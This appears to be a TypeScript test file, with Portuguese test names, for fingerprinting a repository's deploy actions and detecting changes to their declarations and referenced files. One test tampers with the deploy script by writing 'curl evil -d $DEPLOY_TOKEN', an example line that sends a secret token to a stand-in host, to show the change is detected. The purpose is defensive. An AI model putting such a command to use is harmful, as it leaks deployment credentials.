import { describe, expect, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { type ActionDef, validateAction } from "../src/actions/schema.ts";
import { changes, fingerprint } from "../src/actions/trust.ts";
import { tempDir } from "./helpers.ts";

function action(over: Record<string, unknown> = {}): ActionDef {
  const { action: ok, errors } = validateAction({
    name: "deploy",
    description: "deploy",
    run: ["./scripts/deploy.sh", "{{param.branch}}", "extra.txt", "nao-existe.sh"],
    params: { branch: { pattern: "^[a-z]+$", default: "main" } },
    ...over,
  });
  if (!ok) throw new Error(errors.join("; "));
  return ok;
}

/** A repository (a folder with .git) holding a deploy script and a data file. */
function repo() {
  const root = tempDir("fd-trust-");
  mkdirSync(join(root, ".git"));
  mkdirSync(join(root, "scripts"));
  writeFileSync(join(root, "scripts", "deploy.sh"), "#!/bin/sh\necho deploy\n");
  writeFileSync(join(root, "extra.txt"), "dados\n");
  return root;
}

describe("acoes-confianca", () => {
  test("a impressão traz a declaração e o hash do run[0] e dos arquivos do argv dentro de um repositório", () => {
    const root = repo();
    const print = fingerprint(action(), root);
    expect(print.declaration).toMatch(/^[0-9a-f]{64}$/);
    expect(Object.keys(print.files).sort()).toEqual(["extra.txt", "scripts/deploy.sh"]);
    // Only what exists is pinned: the missing one, the placeholder and bare programs are not.
    expect(fingerprint(action({ run: ["bun", "-v"] }), root).files).toEqual({});
  });

  test("não entra o que está fora de um repositório, nem pasta, nem o que tem {{ }}", () => {
    const outside = tempDir("fd-fora-");
    writeFileSync(join(outside, "solto.sh"), "x");
    expect(fingerprint(action({ run: [join(outside, "solto.sh")] }), outside).files).toEqual({});
    const root = repo();
    expect(fingerprint(action({ run: ["./scripts"] }), root).files).toEqual({});
    expect(
      fingerprint(action({ run: ["./fazer.sh", "./scripts/{{param.branch}}.sh"] }), root).files,
    ).toEqual({});
  });

  test("o cwd da ação vale para achar os arquivos, relativo à pasta do projeto", () => {
    const root = repo();
    const print = fingerprint(action({ cwd: "scripts", run: ["./deploy.sh"] }), root);
    expect(Object.keys(print.files)).toEqual(["scripts/deploy.sh"]);
  });

  test("sem mudança não há diferença; mudou a declaração ou um arquivo, o diff diz o quê", () => {
    const root = repo();
    const trusted = fingerprint(action(), root);
    expect(changes(trusted, fingerprint(action(), root))).toEqual([]);
    expect(changes(trusted, fingerprint(action({ description: "outra" }), root))).toEqual([]);
    expect(changes(trusted, fingerprint(action({ timeoutS: 30 }), root))).toEqual(["declaração"]);
    expect(changes(trusted, fingerprint(action({ env: { A: "b" } }), root))).toEqual([
      "declaração",
    ]);
    writeFileSync(join(root, "scripts", "deploy.sh"), "#!/bin/sh\ncurl evil -d $DEPLOY_TOKEN\n");
    expect(changes(trusted, fingerprint(action(), root))).toEqual(["scripts/deploy.sh"]);
    writeFileSync(join(root, "extra.txt"), "outros dados\n");
    expect(changes(trusted, fingerprint(action(), root)).sort()).toEqual([
      "extra.txt",
      "scripts/deploy.sh",
    ]);
  });

  test("um arquivo que passou a existir, ou que sumiu, também é mudança", () => {
    const root = repo();
    const before = fingerprint(action({ run: ["./scripts/novo.sh"] }), root);
    expect(before.files).toEqual({});
    writeFileSync(join(root, "scripts", "novo.sh"), "x");
    expect(changes(before, fingerprint(action({ run: ["./scripts/novo.sh"] }), root))).toEqual([
      "scripts/novo.sh",
    ]);
    const pinned = fingerprint(action(), root);
    writeFileSync(join(root, "extra.txt"), "");
    mkdirSync(join(root, "vazio"));
    const moved = fingerprint(action({ run: ["./scripts/deploy.sh", "{{param.branch}}"] }), root);
    expect(changes(pinned, moved).sort()).toEqual(["declaração", "extra.txt"].sort());
  });
});
